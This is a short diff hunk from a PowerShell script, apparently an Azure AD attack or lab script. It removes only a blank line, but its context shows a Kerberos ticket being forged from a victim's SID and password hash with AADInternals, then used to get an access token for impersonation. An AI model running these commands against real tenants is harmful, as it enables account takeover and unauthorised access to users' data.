@@ -118,7 +118,6 @@ $kerberos=New-AADIntKerberosTicket -SidString $victimUserSid -Hash $hash
 # get an access token for that user
 $at =Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain $fullyQualifiedDomain
 
-
 # start exploring using MS Graph API!
 $MaximumFunctionCount = 8192 # bypass powershell's scope memory limit
 Import-Module Microsoft.Graph.Users
